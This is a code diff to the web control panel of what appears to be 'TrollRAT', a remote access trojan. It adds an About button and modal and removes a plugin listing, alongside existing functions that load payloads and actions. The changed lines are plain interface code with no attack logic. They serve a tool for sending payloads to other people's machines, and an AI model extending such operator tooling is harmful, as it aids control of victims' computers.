@@ -37,7 +37,9 @@
             </div>
 
             <div class="collapse navbar-collapse" id="navbar">
-                <ul class="nav navbar-nav"></ul>
+                <ul class="nav navbar-nav">
+                    <li><button class="btn btn-default navbar-btn" onclick="about();">About</button></li>
+                </ul>
             </div>
         </div>
     </nav>
@@ -58,8 +60,16 @@
             </div>
         </div>
 
-        <div class="well well-sm">
-            <strong>Loaded Plugins: </strong><span id="plugins"></span>
+        <div class="modal fade" id="aboutModal" tabindex="-1" role="dialog">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+                        <h4 class="modal-title">About TrollRAT</h4>
+                    </div>
+                    <div class="modal-body" id="about"></div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -81,7 +91,6 @@
         function update() {
             var active = $("#payloads").children().index($("#payloads .active"));
             
-            loadPlugins();
             loadPayloads(active);
             loadActions(active);
 
@@ -150,12 +159,13 @@
             });
         }
 
-        function loadPlugins() {
+        function about() {
             $.ajax({
                 method: "GET",
-                url: "/plugins",
-            }).done(function (plugins) {
-                $("#plugins").html(plugins);
+                url: "/about",
+            }).done(function (about) {
+                $("#about").html(about);
+                $("#aboutModal").modal();
             }).error(function () {
                 showError("Server communication failed!");
             });
